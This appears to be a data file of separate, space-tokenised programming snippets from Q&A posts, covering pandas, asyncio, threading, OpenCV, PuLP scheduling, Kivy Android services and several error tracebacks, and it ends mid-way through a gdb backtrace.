"import numpy as np import pandas as pd tempdata = np.random.random ( 5 ) myseries_one = pd.Series ( tempdata ) myseries_two = pd.Series ( data = tempdata , index = [ ' a ' , ' b ' , ' c ' , 'd ' , ' e ' ] ) myseries_three = pd.Series ( data = tempdata , index = [ 10,11,12,13,14 ] ) myseries_oneOut [ 1 ] : 0 0.2912931 0.3810142 0.9233603 0.2716714 0.605989dtype : float64myseries_twoOut [ 2 ] : a 0.291293b 0.381014c 0.923360d 0.271671e 0.605989dtype : float64myseries_threeOut [ 3 ] : 10 0.29129311 0.38101412 0.92336013 0.27167114 0.605989dtype : float64 myseries_one [ 0 ] # As expectedOut [ 74 ] : 0.29129291112626043myseries_two [ 0 ] # As expectedOut [ 75 ] : 0.29129291112626043myseries_three [ 0 ] KeyError:0 myseries_one [ 0:2 ] Out [ 78 ] : 0 0.2912931 0.381014dtype : float64myseries_two [ 0:2 ] Out [ 79 ] : a 0.291293b 0.381014dtype : float64myseries_three [ 0:2 ] Out [ 80 ] : 10 0.29129311 0.381014dtype : float64"
"[ 1 , 1 , 1 , 1 , 2 , 2 , 2 , 2 , 3 , 3 , 3 , 3 , 4 , 4 , 4 , 4 ] list ( itertools.chain ( * ( [ x ] * 4 for x in range ( 1 , 5 ) ) ) ) list ( itertools.chain ( * ( itertools.repeat ( x , 4 ) for x in range ( 1 , 5 ) ) ) )"
"def main : for i in range ( 3 ) : set_up_function ( i ) t = Timer ( 1 , run_function , [ i ] ) t.start ( ) time.sleep ( 100 ) # Without this , main thread exitsdef run_function ( i ) : t = Timer ( 1 , run_function , [ i ] ) t.start ( ) print function_with_delay ( i ) ... while True : time.sleep ( 30 ) # or in a try/except with a loop of 1 second sleeps so I can interrupt for i in range ( 3 ) : save_to_disk ( data [ i ] )"
"def work ( ) : time.sleep ( 5 ) fut = asyncio.get_event_loop ( ) .run_in_executor ( None , work )"
"[ 01/Jan/2017:14:15:45 +1000 ] [ 01/Jan/2017:14:15:45 +1000 ] [ 01/Jan/2017:15:16:05 +1000 ] [ 01/Jan/2017:16:16:05 +1000 ] twoPM = 0thrPM = 0fouPM = 0timeStamp = line.split ( ' [ ' ) [ 1 ] .split ( ' ] ' ) [ 0 ] formated_timeStamp = datetime.datetime.strptime ( timeStamp , ' % d/ % b/ % Y : % H : % M : % S % z ' ) .strftime ( ' % H ' ) if formated_timeStamp == '14 ' : twoPM +=1if formated_timeStamp == '15 ' : thrPM +=1if formated_timeStamp == '16 ' : fouPM +=1"
"with assign_match ( ' ( abc ) ( def ) ' , 'abcdef ' ) as ( a , b ) : print ( a , b ) import reclass assign_match ( object ) : def __init__ ( self , regex , string ) : self.regex = regex self.string = string def __enter__ ( self ) : result = re.match ( self.regex , self.string ) if result is None : raise ValueError else : return result.groups ( ) def __exit__ ( self , type , value , traceback ) : print ( self , type , value , traceback ) # testing purposes . not doing anything here.with assign_match ( ' ( abc ) ( def ) ' , 'abcdef ' ) as ( a , b ) : print ( a , b ) # prints abc defwith assign_match ( ' ( abc ) g ' , 'abcdef ' ) as ( a , b ) : # raises ValueError print ( a , b )"
"a = range ( 1 , 3 ) a = iter ( a ) list ( a ) a = list ( a ) a = range ( 1 , 3 ) a = iter ( a ) a = list ( a )"
"params = { 'task ' : 'train ' , 'boosting_type ' : 'gbdt ' , 'objective ' : 'binary ' , 'metric ' : { 'binary_logloss ' } , 'metric_freq':10 , 'num_leaves ' : 511 , 'max_depth':8 , 'learning_rate ' : 0.1 , 'feature_fraction ' : 1 , 'bagging_fraction ' : 0.8 , 'bagging_freq ' : 1 , 'verbose':10 } [ 1 ] valid_0 's binary_logloss : 0.607487Train until valid scores did n't improve in 5 rounds . [ 2 ] valid_0 's binary_logloss : 0.537403 [ 3 ] valid_0 's binary_logloss : 0.479081 [ 4 ] valid_0 's binary_logloss : 0.429961 [ 5 ] valid_0 's binary_logloss : 0.388182 [ 6 ] valid_0 's binary_logloss : 0.35239 [ 7 ] valid_0 's binary_logloss : 0.321529 [ 8 ] valid_0 's binary_logloss : 0.294795 [ 9 ] valid_0 's binary_logloss : 0.271543 [ 10 ] valid_0 's binary_logloss : 0.251267 [ 11 ] valid_0 's binary_logloss : 0.233531 [ 12 ] valid_0 's binary_logloss : 0.217997 [ 13 ] valid_0 's binary_logloss : 0.204344"
"( 'text ' , ( 'othertext ' , ( 'moretext ' , ( 'yetmoretext ' ) ) ) )"
"def find_lines ( img ) : gray = cv.cvtColor ( img , cv.COLOR_BGR2GRAY ) edges = cv.dilate ( gray , np.ones ( ( 3,3 ) , np.uint8 ) , iterations=5 ) edges = cv.Canny ( gray , 50 , 150 , apertureSize=3 ) lines = cv.HoughLines ( edges , 1 , np.pi/180 , 350 )"
"from scipy import spatialimport numpy as np # some datax , y = np.mgrid [ 0:3 , 0:3 ] data = zip ( x.ravel ( ) , y.ravel ( ) ) points = [ [ 0,1 ] , [ 2,2 ] ] # KDTreetree = spatial.cKDTree ( data ) # incices of points in tree should be [ 1,8 ] [ tree.query_ball_point ( i , r=0 ) for i in points ] > > > [ [ 1 ] , [ 8 ] ]"
"def start_requests ( self ) ... dispatcher.connect ( self.spider_closed , signal=signals.engine_stopped ) ... .def spider_closed ( spider ) : print 'this gets printed alright ' # < -only if the next line is omitted ... out = self.AnotherFunction ( in ) # < -This does n't seem to run"
"import asyncioasync def time_consuming ( t ) : print ( f '' Going to sleep for { t } seconds '' ) await asyncio.sleep ( t ) print ( f '' Slept { t } seconds '' ) return tasync def generator ( ) : for i in range ( 4 , 0 , -1 ) : yield await time_consuming ( i ) async def consumer ( ) : async for t in generator ( ) : print ( f '' Doing something with { t } '' ) if __name__ == '__main__ ' : loop = asyncio.new_event_loop ( ) loop.run_until_complete ( consumer ( ) ) loop.close ( ) Going to sleep for 4 secondsSlept 4 secondsDoing something with 4Going to sleep for 3 secondsSlept 3 secondsDoing something with 3Going to sleep for 2 secondsSlept 2 secondsDoing something with 2Going to sleep for 1 secondsSlept 1 secondsDoing something with 1 Going to sleep for 4 secondsGoing to sleep for 3 secondsGoing to sleep for 2 secondsGoing to sleep for 1 secondsSlept 4 secondsDoing something with 4Slept 3 secondsDoing something with 3Slept 2 secondsDoing something with 2Slept 1 secondsDoing something with 1"
"A = np.random.rand ( 10 , 20 ) A = 2 * A # Operation 1 : Is a copy of A made , and a reference assigned to A ? B = 2 * A # Operation 2 : Does B get a completely different copy of A ? C = A # Operation 3 : Does C get a reference to A ? A [ 0 , : ] = 3 D = A * B * C # Elementwise multiplication , if A * B allocates memory , does # ( A * B ) * C allocate another patch of memory ?"
"import logginglogger = logging.getLogger ( __name__ ) def today ( ... ) : logger.info ( 'Sun is shining , the weather is sweet ' ) 2016-08-11 14:54:06 mylib.foo.today : INFO Sun is shining , the weather is sweet import loggingdef third_party ( ... ) : logging.info ( 'Make you want to move your dancing feet ' ) 2016-08-09 08:28:04 root.third_party : INFO Make you want to move your dancing feet 2016-08-09 08:28:04 other_lib.some_file.third_party : INFO Make you want to move your dancing feet logger = logging.getLogger ( __name__ )"
"import randomdef big_gen ( ) : i = 0 group = ' a ' while group ! = 'd ' : i += 1 yield ( group , i ) if random.random ( ) < 0.20 : group = chr ( ord ( group ) + 1 ) def printer ( group_letter , generator ) : print `` These numbers are in group % s : '' % group_letter for num in generator : print `` \t % s '' % num These numbers are in group a:12345678These numbers are in group b:9These numbers are in group c:10111213"
"`` ERwin '' : `` PERSON '' In [ 6 ] : NERTagger.tag ( `` Involved in all aspects of data modeling using ERwin as the primary software for this . `` .split ( ) ) Out [ 6 ] : [ ( u'Involved ' , u ' O ' ) , ( u'in ' , u ' O ' ) , ( u'all ' , u ' O ' ) , ( u'aspects ' , u ' O ' ) , ( u'of ' , u ' O ' ) , ( u'data ' , u ' O ' ) , ( u'modeling ' , u ' O ' ) , ( u'using ' , u ' O ' ) , ( u'ERwin ' , u ' O ' ) , ( u'as ' , u ' O ' ) , ( u'the ' , u ' O ' ) , ( u'primary ' , u ' O ' ) , ( u'software ' , u ' O ' ) , ( u'for ' , u ' O ' ) , ( u'this . ' , u ' O ' ) ] class StanfordNERTagger ( StanfordTagger ) : '' '' '' A class for Named-Entity Tagging with Stanford Tagger . The input is the paths to : - a model trained on training data- ( optionally ) the path to the stanford tagger jar file . If not specified here , then this jar file must be specified in the CLASSPATH envinroment variable.- ( optionally ) the encoding of the training data ( default : UTF-8 ) Example : > > > from nltk.tag import StanfordNERTagger > > > st = StanfordNERTagger ( 'english.all.3class.distsim.crf.ser.gz ' ) # doctest : +SKIP > > > st.tag ( 'Rami Eid is studying at Stony Brook University in NY'.split ( ) ) # doctest : +SKIP [ ( 'Rami ' , 'PERSON ' ) , ( 'Eid ' , 'PERSON ' ) , ( 'is ' , ' O ' ) , ( 'studying ' , ' O ' ) , ( 'at ' , ' O ' ) , ( 'Stony ' , 'ORGANIZATION ' ) , ( 'Brook ' , 'ORGANIZATION ' ) , ( 'University ' , 'ORGANIZATION ' ) , ( 'in ' , ' O ' ) , ( 'NY ' , 'LOCATION ' ) ] '' '' '' _SEPARATOR = '/'_JAR = 'stanford-ner.jar'_FORMAT = 'slashTags'def __init__ ( self , *args , **kwargs ) : super ( StanfordNERTagger , self ) .__init__ ( *args , **kwargs ) @ propertydef _cmd ( self ) : # Adding -tokenizerFactory edu.stanford.nlp.process.WhitespaceTokenizer -tokenizerOptions tokenizeNLs=false for not using stanford Tokenizer return [ 'edu.stanford.nlp.ie.crf.CRFClassifier ' , '-loadClassifier ' , self._stanford_model , '-textFile ' , self._input_file_path , '-outputFormat ' , self._FORMAT , '-tokenizerFactory ' , 'edu.stanford.nlp.process.WhitespaceTokenizer ' , '-tokenizerOptions ' , '\ '' tokenizeNLs=false\ '' ' ] def parse_output ( self , text , sentences ) : if self._FORMAT == 'slashTags ' : # Joint together to a big list tagged_sentences = [ ] for tagged_sentence in text.strip ( ) .split ( `` \n '' ) : for tagged_word in tagged_sentence.strip ( ) .split ( ) : word_tags = tagged_word.strip ( ) .split ( self._SEPARATOR ) tagged_sentences.append ( ( `` .join ( word_tags [ : -1 ] ) , word_tags [ -1 ] ) ) # Separate it according to the input result = [ ] start = 0 for sent in sentences : result.append ( tagged_sentences [ start : start + len ( sent ) ] ) start += len ( sent ) ; return result raise NotImplementedError"
"def reduceExpr ( useArray ) : # Use Python 's native eval ( ) to compute if no letters are detected . if ( not hasLetters ( useArray ) ) : return [ calculate ( useArray ) ] # Different from eval ( ) because it returns string version of result # Base case . Returns useArray if the list size is 1 ( i.e. , it contains one string ) . if ( len ( useArray ) == 1 ) : return useArray # Base case . Returns the space-joined elements of useArray as a list with one string . if ( len ( useArray ) == 3 ) : return [ ' '.join ( useArray ) ] # Checks to see if parentheses are present in the expression & sets . # Counts number of parentheses & keeps track of first ( found . parentheses = 0 leftIdx = -1 # This try/except block is essentially an if/else block . Since useArray.index ( ' ( ' ) triggers a KeyError # if it ca n't find ' ( ' in useArray , the next line is not carried out , and parentheses is not incremented . try : leftIdx = useArray.index ( ' ( ' ) parentheses += 1 except Exception : pass # If a KeyError was returned , leftIdx = -1 and rightIdx = parentheses = 0. rightIdx = leftIdx + 1 while ( parentheses > 0 ) : if ( useArray [ rightIdx ] == ' ( ' ) : parentheses += 1 elif ( useArray [ rightIdx ] == ' ) ' ) : parentheses -= 1 rightIdx += 1 # Provided parentheses pair is n't empty , runs contents through again ; else , removes the parentheses if ( leftIdx > -1 and rightIdx - leftIdx > 2 ) : return reduceExpr ( useArray [ : leftIdx ] + [ ' '.join ( [ ' ( ' , reduceExpr ( useArray [ leftIdx+1 : rightIdx-1 ] ) [ 0 ] , ' ) ' ] ) ] + useArray [ rightIdx : ] ) elif ( leftIdx > -1 ) : return reduceExpr ( useArray [ : leftIdx ] + useArray [ rightIdx : ] ) # If operator is + or - , hold the first two elements and process the rest of the list first if isAddSub ( useArray [ 1 ] ) : return reduceExpr ( useArray [ :2 ] + reduceExpr ( useArray [ 2 : ] ) ) # Else , if operator is * or / , process the first 3 elements first , then the rest of the list elif isMultDiv ( useArray [ 1 ] ) : return reduceExpr ( reduceExpr ( useArray [ :3 ] ) + useArray [ 3 : ] ) # Just placed this so the compiler would n't complain that the function had no return ( since this was called by yet another function ) . return None"
hour value 0 0 1 1 6 2 2 12 3 3 18 4 4 0 5 5 6 6 6 12 7 7 18 8 8 6 9 9 12 10 10 18 11 11 12 12 12 18 13 13 0 14
"package net.saband.myapp ; import android.content.BroadcastReceiver ; import android.content.Intent ; import android.content.Context ; import org.kivy.android.PythonActivity ; public class MyBroadcastReceiver extends BroadcastReceiver { public void onReceive ( Context context , Intent intent ) { Intent ix = new Intent ( context , PythonActivity.class ) ; ix.addFlags ( Intent.FLAG_ACTIVITY_NEW_TASK ) ; context.startActivity ( ix ) ; } } package net.saband.myapp ; import android.content.BroadcastReceiver ; import android.content.Intent ; import android.content.Context ; import net.saband.myapp.ServiceMyservice ; public class MyBroadcastReceiver extends BroadcastReceiver { public void onReceive ( Context context , Intent intent ) { Intent ix = new Intent ( context , ServiceMyservice.class ) ; ix.addFlags ( Intent.FLAG_ACTIVITY_NEW_TASK ) ; context.startService ( ix ) ; } } 10-21 19:16:44.784 1513 1569 I ActivityManager : Start proc 6334 : net.saband.myapp : service_myservice/u0a116 for service net.saband.myapp/.ServiceMyservice10-21 19:16:44.786 6334 6334 I art : Late-enabling -Xcheck : jni10-21 19:16:44.885 6334 6334 D AndroidRuntime : Shutting down VM10-21 19:16:44.888 6334 6334 E AndroidRuntime : FATAL EXCEPTION : main10-21 19:16:44.888 6334 6334 E AndroidRuntime : Process : net.saband.myapp : service_myservice , PID : 633410-21 19:16:44.888 6334 6334 E AndroidRuntime : Theme : themes : { } 10-21 19:16:44.888 6334 6334 E AndroidRuntime : java.lang.RuntimeException : Unable to start service net.saband.myapp.ServiceMyservice @ 8c96929 with Intent { cmp=net.saband.myapp/.ServiceMyservice } : java.lang.NullPointerException : Attempt to invoke virtual method 'java.lang.String android.os.Bundle.getString ( java.lang.String ) ' on a null object reference from time import sleepif __name__ == '__main__ ' : while True : print `` myapp service '' sleep ( 5 ) def __start_service ( self ) : if platform == 'android ' : service = autoclass ( 'net.saband.myapp.ServiceMyservice ' ) mActivity = autoclass ( 'org.kivy.android.PythonActivity ' ) .mActivity argument = `` service.start ( mActivity , argument )"
"t= ' @ abc @ def Hello this part is text ' l= [ `` abc '' , `` def '' ] s='Hello this part is text ' a=t [ t.find ( ' ' , t.rfind ( ' @ ' ) ) : ] .strip ( ) s=t [ : t.find ( ' ' , t.rfind ( ' @ ' ) ) ] .strip ( ) b=a.split ( ' @ ' ) l= [ i.strip ( ) for i in b ] [ 1 : ] t= ' @ abc @ def My email is red @ hjk.com '"
dict = { ... } # lots of words in dictionary for word in ... : # long list of words if word in dict : # do something dict = { ... } dict_keys = dict.keys ( ) for word in ... : if word in dict_keys : # do something
"> > > @ loggingdecorator ... def myfunction ( ) : ... foo ( ) ... bar ( ) ... baz ( ) > > > myfunction ( ) Starting myfunctionfoo ( ) ... [ OK ] bar ( ) ... [ OK ] baz ( ) ... [ OK ] myfunction Done ! import sysdef logging_tracer ( frame , event , arg ) : def local_tracer ( local_frame , event , arg ) : if frame is local_frame : print frame.f_code.co_name , event , arg print frame.f_code.co_name , event , arg return local_tracerdef loggingdecorator ( func ) : def _wrapper ( ) : old_trace_function = sys.gettrace ( ) sys.settrace ( logging_tracer ) try : result = func ( ) except : raise else : return result finally : sys.settrace ( old_trace_function ) return _wrapper"
"max ( matrix ) min ( matrix ) argmax ( matrix ) argmin ( matrix ) a = np.arange ( 5*5 ) .reshape ( 5 , 5 ) + 10 # array ( [ [ 10 , 11 , 12 , 13 , 14 ] , # [ 15 , 16 , 17 , 18 , 19 ] , # [ 20 , 21 , 22 , 23 , 24 ] , # [ 25 , 26 , 27 , 28 , 29 ] , # [ 30 , 31 , 32 , 33 , 34 ] ] ) In [ 86 ] : np.max ( a ) # getting the max-value out of aOut [ 86 ] : 34In [ 87 ] : np.argmax ( a ) # index of max-value 34 is 24 if array a were flattenedOut [ 87 ] : 24"
"> > > class Color ( enum.Enum ) : black = [ 1,2 ] blue = [ 1,2,3 ] > > > Color.blue is Color.blackFalse > > > Color.black == Color.blueFalse > > > Color.black.value.append ( 3 ) > > > Color.black < Color.black : [ 1 , 2 , 3 ] > > > > Color.blue < Color.blue : [ 1 , 2 , 3 ] > > > > Color.blue == Color.blackFalse > > > Color.black.value == Color.blue.valueTrue > > > class Color ( enum.Enum ) : black = [ 1,2,3 ] blue = [ 1,2,3 ] > > > Color.blue is Color.blackTrue > > > Color.black == Color.blueTrue > > > Color.black.value.append ( 4 ) > > > Color.black < Color.black : [ 1 , 2 , 3 , 4 ] > > > > Color.blue < Color.black : [ 1 , 2 , 3 , 4 ] > > > > Color.blue == Color.blackTrue"
from file2 import tfunclass TestException ( Exception ) : passtry : print ' I am running ' tfun ( ) except TestException as e : print ' I am caught ' print type ( e ) except Exception as e : print ' I am generally caught ' print type ( e ) def tfun ( ) : from file1 import TestException raise TestException ( ) I am runningI am runningI am caught < class 'file1.TestException ' > I am generally caught < class 'file1.TestException ' >
"def map_type ( input ) : if isinstance ( input , int ) : return MyEnum ( input ) elif isinstance ( input , str ) : return MyCustomClass ( str ) def map_type ( input : Union [ int , str ] ) - > Union [ MyEnum , MyCustomClass ] : ... myvar = map_type ( 'foobar ' ) print ( myvar.property_of_my_custom_class ) from typing import Unionfrom enum import Enumclass MyEnum ( Enum ) : VALUE_1 = 1 VALUE_2 = 2class MyCustomClass : def __init__ ( self , value : str ) - > None : self.value = value @ property def myproperty ( self ) - > str : return 2 * self.valuedef map_type ( value : Union [ int , str ] ) - > Union [ MyEnum , MyCustomClass ] : if isinstance ( value , int ) : return MyEnum ( value ) elif isinstance ( value , str ) : return MyCustomClass ( value ) raise TypeError ( 'Invalid input type ' ) myvar1 = map_type ( 1 ) print ( myvar1.value , myvar1.name ) myvar2 = map_type ( 'foobar ' ) print ( myvar2.myproperty )"
"try : 1e4**100except OverflowError as ofe : print ofe.args # # prints ' ( 34 , 'Numerical result out of range ' ) '"
data = pipeline | beam.Create ( [ 'gs : //my/file.pkl ' ] ) | beam.ParDo ( LoadFileDoFn ) shuffled_data = data | beam.Shuffle ( )
"1 ) At any given time period , you must meet the minimum staffing requirements2 ) A person has a minimum and maximum amount of hours they can do3 ) An employee can only be scheduled to work within their available hours4 ) A person can only work one shift per day import pandas as pdimport matplotlib.pyplot as pltimport matplotlib.dates as datesimport pulpstaffing_requirements = pd.DataFrame ( { 'Time ' : [ ' 0/1/1900 8:00:00 ' , ' 0/1/1900 9:59:00 ' , ' 0/1/1900 10:00:00 ' , ' 0/1/1900 12:29:00 ' , ' 0/1/1900 12:30:00 ' , ' 0/1/1900 13:00:00 ' , ' 0/1/1900 13:02:00 ' , ' 0/1/1900 13:15:00 ' , ' 0/1/1900 13:20:00 ' , ' 0/1/1900 18:10:00 ' , ' 0/1/1900 18:15:00 ' , ' 0/1/1900 18:20:00 ' , ' 0/1/1900 18:25:00 ' , ' 0/1/1900 18:45:00 ' , ' 0/1/1900 18:50:00 ' , ' 0/1/1900 19:05:00 ' , ' 0/1/1900 19:07:00 ' , ' 0/1/1900 21:57:00 ' , ' 0/1/1900 22:00:00 ' , ' 0/1/1900 22:30:00 ' , ' 0/1/1900 22:35:00 ' , ' 1/1/1900 3:00:00 ' , ' 1/1/1900 3:05:00 ' , ' 1/1/1900 3:20:00 ' , ' 1/1/1900 3:25:00 ' ] , 'People ' : [ 1,1,2,2,3,3,2,2,3,3,4,4,3,3,2,2,3,3,4,4,3,3,2,2,1 ] , } ) staff_availability = pd.DataFrame ( { 'Person ' : [ 'C1 ' , 'C2 ' , 'C3 ' , 'C4 ' , 'C5 ' , 'C6 ' , 'C7 ' , 'C8 ' , 'C9 ' , 'C10 ' , 'C11 ' ] , 'MinHours ' : [ 3,3,3,3,3,3,3,3,3,3,3 ] , 'MaxHours ' : [ 10,10,10,10,10,10,10,10,10,10,10 ] , 'HourlyWage ' : [ 26,26,26,26,26,26,26,26,26,26,26 ] , 'Availability_Hr ' : [ ' 8-18 ' , ' 8-18 ' , ' 8-18 ' , ' 9-18 ' , ' 9-18 ' , ' 9-18 ' , '12-1 ' , '12-1 ' , '17-3 ' , '17-3 ' , '17-3 ' ] , 'Availability_15min_Seg ' : [ ' 1-41 ' , ' 1-41 ' , ' 1-41 ' , ' 5-41 ' , ' 5-41 ' , ' 5-41 ' , '17-69 ' , '17-79 ' , '37-79 ' , '37-79 ' , '37-79 ' ] , } ) staffing_requirements [ 'Time ' ] = [ '/'.join ( [ str ( int ( x.split ( '/ ' ) [ 0 ] ) +1 ) ] + x.split ( '/ ' ) [ 1 : ] ) for x in staffing_requirements [ 'Time ' ] ] staffing_requirements [ 'Time ' ] = pd.to_datetime ( staffing_requirements [ 'Time ' ] , format= ' % d/ % m/ % Y % H : % M : % S ' ) formatter = dates.DateFormatter ( ' % Y- % m- % d % H : % M : % S ' ) # 15 Minstaffing_requirements = staffing_requirements.groupby ( pd.Grouper ( freq='15T ' , key='Time ' ) ) [ 'People ' ] .max ( ) .ffill ( ) staffing_requirements = staffing_requirements.reset_index ( level= [ 'Time ' ] ) staffing_requirements.index = range ( 1 , len ( staffing_requirements ) + 1 ) staff_availability.set_index ( 'Person ' ) staff_costs = staff_availability.set_index ( 'Person ' ) [ [ 'MinHours ' , 'MaxHours ' , 'HourlyWage ' ] ] availability = staff_availability.set_index ( 'Person ' ) [ [ 'Availability_15min_Seg ' ] ] availability [ [ 'first_15min ' , 'last_15min ' ] ] = availability [ 'Availability_15min_Seg ' ] .str.split ( '- ' , expand=True ) .astype ( int ) availability_per_member = [ pd.DataFrame ( 1 , columns= [ idx ] , index=range ( row [ 'first_15min ' ] , row [ 'last_15min ' ] +1 ) ) for idx , row in availability.iterrows ( ) ] availability_per_member = pd.concat ( availability_per_member , axis='columns ' ) .fillna ( 0 ) .astype ( int ) .stack ( ) availability_per_member.index.names = [ 'Timeslot ' , 'Person ' ] availability_per_member = ( availability_per_member.to_frame ( ) .join ( staff_costs [ [ 'HourlyWage ' ] ] ) .rename ( columns= { 0 : 'Available ' } ) ) ' '' Generate shift times based off availability `` 'prob = pulp.LpProblem ( 'CreateStaffing ' , pulp.LpMinimize ) # Minimize coststimeslots = staffing_requirements.indexpersons = availability_per_member.index.levels [ 1 ] # A member is either staffed or is not at a certain timeslotstaffed = pulp.LpVariable.dicts ( `` staffed '' , ( ( timeslot , staffmember ) for timeslot , staffmember in availability_per_member.index ) , lowBound=0 , cat='Binary ' ) # Objective = cost ( = sum of hourly wages ) prob += pulp.lpSum ( [ staffed [ timeslot , staffmember ] * availability_per_member.loc [ ( timeslot , staffmember ) , 'HourlyWage ' ] for timeslot , staffmember in availability_per_member.index ] ) # Staff the right number of peoplefor timeslot in timeslots : prob += ( sum ( [ staffed [ ( timeslot , person ) ] for person in persons ] ) == staffing_requirements.loc [ timeslot , 'People ' ] ) # Do not staff unavailable personsfor timeslot in timeslots : for person in persons : if availability_per_member.loc [ ( timeslot , person ) , 'Available ' ] == 0 : prob += staffed [ timeslot , person ] == 0 # Do not underemploy peoplefor person in persons : prob += ( sum ( [ staffed [ ( timeslot , person ) ] for timeslot in timeslots ] ) > = staff_costs.loc [ person , 'MinHours ' ] *4 ) # timeslot is 15 minutes = > 4 timeslots = hour # Do not overemploy peoplefor person in persons : prob += ( sum ( [ staffed [ ( timeslot , person ) ] for timeslot in timeslots ] ) < = staff_costs.loc [ person , 'MaxHours ' ] *4 ) # timeslot is 15 minutes = > 4 timeslots = hourprob.solve ( ) print ( pulp.LpStatus [ prob.status ] ) output = [ ] for timeslot , staffmember in staffed : var_output = { 'Timeslot ' : timeslot , 'Staffmember ' : staffmember , 'Staffed ' : staffed [ ( timeslot , staffmember ) ] .varValue , } output.append ( var_output ) output_df = pd.DataFrame.from_records ( output ) # .sort_values ( [ 'timeslot ' , 'staffmember ' ] ) output_df.set_index ( [ 'Timeslot ' , 'Staffmember ' ] , inplace=True ) if pulp.LpStatus [ prob.status ] == 'Optimal ' : print ( output_df ) Timeslot C0 1 C21 2 C22 3 C13 4 C34 5 C65 6 C16 7 C57 8 C2"
"perf stat -p < my_pid > x = subprocess.call ( [ `` perf '' , '' stat '' , '' -p '' , str ( GetMyProcessID ( ) ) ] ) .. CODE TO DEBUG ..print x # I want to terminate subprocess here and output ' x '"
"Traceback ( most recent call last ) : File `` /Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/runtime/wsgi.py '' , line 168 , in Handle handler = _config_handle.add_wsgi_middleware ( self._LoadHandler ( ) ) File `` /Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/runtime/wsgi.py '' , line 206 , in _LoadHandler handler = __import__ ( path [ 0 ] ) [ ... ] File `` /Users/joneill/OpenSTV/OpenSTV/trunk/OpaVote-HR/main.py '' , line 2 , in < module > import views [ ... ] File `` /Users/joneill/OpenSTV/OpenSTV/trunk/OpaVote-HR/views.py '' , line 3 , in < module > from pytz.gae import pytz [ ... ] File `` /Users/joneill/OpenSTV/OpenSTV/trunk/OpaVote-HR/pytz/__init__.py '' , line 34 , in < module > from pkg_resources import resource_stream File `` /Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/tools/dev_appserver_import_hook.py '' , line 662 , in Decorate return func ( self , *args , **kwargs ) File `` /Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/tools/dev_appserver_import_hook.py '' , line 1818 , in load_module return self.FindAndLoadModule ( submodule , fullname , search_path ) File `` /Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/tools/dev_appserver_import_hook.py '' , line 662 , in Decorate return func ( self , *args , **kwargs ) File `` /Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/tools/dev_appserver_import_hook.py '' , line 1690 , in FindAndLoadModule description ) File `` /Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/tools/dev_appserver_import_hook.py '' , line 662 , in Decorate return func ( self , *args , **kwargs ) File `` /Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/tools/dev_appserver_import_hook.py '' , line 1615 , in LoadModuleRestricted return source_file.load_module ( submodule_fullname ) File `` /Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/dist/py_zipimport.py '' , line 246 , in load_module submodname , is_package , fullpath , source = self._get_source ( fullmodname ) File `` /Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/dist/py_zipimport.py '' , line 207 , in _get_source source = self.zipfile.read ( relpath.replace ( os.sep , '/ ' ) ) File `` /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/zipfile.py '' , line 867 , in read return self.open ( name , `` r '' , pwd ) .read ( ) File `` /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/zipfile.py '' , line 882 , in open zef_file = open ( self.filename , 'rb ' ) File `` /Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/tools/dev_appserver_import_hook.py '' , line 578 , in __init__ raise IOError ( errno.EACCES , 'file not accessible ' , filename ) IOError : [ Errno 13 ] file not accessible : '/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/setuptools-0.6c11-py2.7.egg'INFO 2012-01-21 20:50:44,222 dev_appserver.py:2832 ] `` POST /manage HTTP/1.1 '' 500 -"
"lookup = { 0 : [ :540 ] , 30 : [ 540:1080 ] , 60 : [ 1080 : ] }"
"string = `` < text > < ? oasys _dc21- ? > Text < i > contents < /i > < /text > '' tree = lxml.etree.fromstring ( string ) print tree.findall ( `` .// '' ) > > > > [ < Element i at 0x747c > ] print tree.getchildren ( ) > > > > [ < ? oasys _dc21- ? > , < Element i at 0x747x > ] print tree.getchildren ( ) [ 0 ] .tag > > > > < built-in function ProcessingInstruction > print tree.getchildren ( ) [ 0 ] .tail > > > > Text"
"aerospike_dca_client.put ( key , bin ) ... ... bls_key_a = ( AEROSPIKE_NAMESPACE , SET_NAME , bls_key ) hp_bid_str_a = aerospike_dca_client.get ( bls_key_a ) [ 3 ] ; # Terminates at the line above Program received signal SIGSEGV , Segmentation fault.as_shm_node_get ( cluster=0x353bd90508 , ns=0x7fffffffc851 `` test '' , digest=0x7fffffffc8e1 `` /\231 ! \221h\223\240\021KX\377\357O\346u\214q\356\267 # \177 '' , write=false , replica=AS_POLICY_REPLICA_MASTER ) at src/main/aerospike/as_shm_cluster.c:431 431 src/main/aerospike/as_shm_cluster.c : No such file or directory . in src/main/aerospike/as_shm_cluster.c Missing separate debuginfos , use : debuginfo-install blas-3.2.1-4.el6.x86_64 ( gdb ) bt # 0 as_shm_node_get ( cluster=0x353bd90508 , ns=0x7fffffffc851 `` test '' , digest=0x7fffffffc8e1 `` /\231 ! \221h\223\240\021KX\377\357O\346u\214q\356\267 # \177 '' , write=false , replica=AS_POLICY_REPLICA_MASTER ) at src/main/aerospike/as_shm_cluster.c:431 # 1 0x00007fffdf219ce5 in as_node_get ( cluster=0x353bd90508 , err=0x7fffffffc920 , cn=0x7fffffffc7c0 , command=0x7fffffffc740 `` \002\003 '' , command_len=82 , timeout_ms=1000 , 